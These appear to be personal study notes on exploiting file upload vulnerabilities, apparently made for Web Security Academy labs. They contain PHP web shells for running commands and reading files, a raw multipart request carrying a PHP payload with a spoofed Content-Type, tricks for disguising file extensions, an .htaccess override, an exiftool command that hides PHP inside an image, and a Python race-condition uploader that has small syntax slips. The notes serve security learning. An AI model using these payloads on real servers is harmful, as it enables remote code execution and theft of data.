### Exploiting Unrestricted file uploads to deploy a web shell
If there are no checks on what file is being uploaded, in this worst case scenario, one might be able to just upload javascript, python or PHP scripts and query them to give ourselves a webshell, for example a simple PHP file containing the following code would allow us to access any file as a string.
```
<?php echo file_get_contents('file_location'); ?>
```
Then querying the page `https://site.com/exploit.php` would give use the files.

Getting more creative, using parameters one could just give ourselves the ability to execute arbitrary commands using the following code
```
<?php echo system($_GET['command']); ?>
```
Querying the page as follows, would allow us to execute any command and see it's respective output
```
GET /example/exploit.php?command=ls HTTP/1.1
```

### Exploiting flawed validation of file uploads

__Flawed File Type Validation__
Forms which submit multiple inputs such as text, and images have POST request's which multiple paths, which usually look as follows
```
POST /my-account/avatar HTTP/2
Host: 0adc00cb04ac2e3383b5cd4300d500d3.web-security-academy.net
Cookie: session=pRsGZ03Ox4FEUQrsFsE1OXbIDjTrybmM
Content-Length: 463
Cache-Control: max-age=0
Sec-Ch-Ua: "Not-A.Brand";v="24", "Chromium";v="146"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Accept-Language: en-GB,en;q=0.9
Origin: https://0adc00cb04ac2e3383b5cd4300d500d3.web-security-academy.net
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryjrT1Guuh6hPZgFUh
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0adc00cb04ac2e3383b5cd4300d500d3.web-security-academy.net/my-account?id=wiener
Accept-Encoding: gzip, deflate, br
Priority: u=0, i

------WebKitFormBoundaryjrT1Guuh6hPZgFUh
Content-Disposition: form-data; name="avatar"; filename="exploit.php"
Content-Type: application/x-php

<?php echo file_get_contents("/home/carlos/secret"); ?>

------WebKitFormBoundaryjrT1Guuh6hPZgFUh
Content-Disposition: form-data; name="user"

wiener
------WebKitFormBoundaryjrT1Guuh6hPZgFUh
Content-Disposition: form-data; name="csrf"

KeNvznayxDiDzDYgQi1xh9vDt3mw1SDb
------WebKitFormBoundaryjrT1Guuh6hPZgFUh--
```
Observe the `Content-Type` parameter for each part of the submitted form, it gives info about the file type uploaded, or the format of the data. Certain applications trust this parameter to make sure only the right kind of file is being uploaded rather than verifying the file type themselves. Thus changing the `Content-Type` to something like `image/jpeg` or `image/png` can help bypass this kind of check. 

__Preventing File execution in user accessible directories__
Certain applications prevent the execution of files in user accessible directories, in this case if path traversal vulnerabilities are present, or in some other way we can upload our files to a unintended location on the server than one can still allow execution of scripts on the server.

__Insufficient Blacklisting of dangerous file types__
Some applications try to block dangerous file types such as `php` from being uploaded at all, however it is very hard to block every single type of dangerous file type. Lesser known file types such as `.php5` or `.shtml` may pass through and result in vulnerabilities

__Overriding the server configuration__
Servers typically don't execute files unless instructed to do so, Apache servers have the `apache2.conf` file. Most servers also have directory specific configuration files which override global configurations for the server. Apache servers for example use the `.htaccess` file in the directory and IIS servers use the `web.config` file. If the server doesn't prevent uploading our own configuration files then one could use such a file to map a arbitrary extensions to an executable [[Media Types(MIME Types)|MIME Type]].
```
AddType application/x-httpd-php .l33t
```
The above directive is an example.

__Obfuscating File extensions__
There are multiple ways one can obfuscate file extensions, some of the most common are as follows
- Use combinations of capitalizations, such as the using the extension  `.pHp` instead of `.php` or something else. If the code matching mime types is not case sensitive and this bypasses the extension checks this would allow us to sneak PHP files across.
- Some algorithms exploit trailing characters such as `exploit.php.` might work.
- URL encoding things such as the `.` in the file names sometimes works too.
- If the back end happens to utilise lower level C/C++ functions you might be able to smuggle files through using introduction of null bytes into the file names, something like `exploit.php%00.png` might work.(semicolons too `exploit.php;.png`)
- UTF overlong encodings are a old feature of UTF-8 which allow single characters to be represented using 2 byte sequences. For example `xC0 x2E` or `xC4 xAE` may translate to `x2E` then converted to ASCII characters which will result in the `.` character.
- Some applications strip `.php`, however if this is not recursive one can do, `exploit.p.phphp` and this would work!

__Flawed Validation of the file's contents__
Instead of just relying on the `Content-Type` header, severs also might verify the content of the file in reality, if it wants only images to be uploaded, checking things such as magic numbers and dimensions might be a way to verify the file is what it says it is.

Even this is not bullet proof tho, using tools such as exiftool to add comments containing PHP code into a file and then renaming the image, can result in the server allowing the upload and at the same time executing the PHP code. Something like this
```
$ exiftool -Comment=".<?php echo 'START ' . file_get_contents('file_location'); . ' END'?>" image.jpg
$ mv image.jpg image.php
```

__Exploiting File Upload Race Conditions__
Certain applications store the file on the server, verify if it is safe and if not only then they remove it. The small time window between storing it on the server and verifying the safety can be used to request the file. This can be done using burp intruder or even a simple multi threaded python script as follows
```
import requests
from concurrent.futures import ThreadPoolExecutor


def upload():
    url = "url"

    files = {
	    <files>
    }

    data = {
        <data>
    }

    cookies = {
        <cookies>
    }

    return requests.post(
        url,
        files=files,
        data=data,
        cookies=cookies
    )


def get():
    url = "url

    cookies = {
        <cookies>
    }

    return requests.get(url, cookies=cookies)


def race():
    # Start upload in a separate thread
    with ThreadPoolExecutor(max_workers=6) as executor:

        upload = executor.submit(upload)

        # Immediately fire GET requests
        gets = [
            executor.submit(get)
            for _ in range(5)
        ]

        print("Upload:", upload.result().status_code)

        for i, response in enumerate(gets):
            r = response.result()
            print(f"GET {i}: {r.status_code}")
            print(r.text)


race()
```
### Exploiting file upload vulnerabilities without remote code execution
File upload vulnerabilities can be exploited even without using remote code execution, some ways are as follows
- Uploading malicious client side scripts, such as html files with script tags, resulting in stored XSS attacks or even svg files. 
- Exploiting vulnerabilities in parsing of files such as `.xml` files.

Certain servers are also configured to support PUT requests which can provide a way to upload files, a example request would be as follows
```
PUT /images/exploit.php HTTP/1.1 
Host: vulnerable-website.com 
Content-Type: application/x-httpd-php 
Content-Length: 49 

<?php echo file_get_contents('/path/to/file'); ?>
```
One can use `OPTIONS` requests to look at permitted communication options for a endpoint or a server.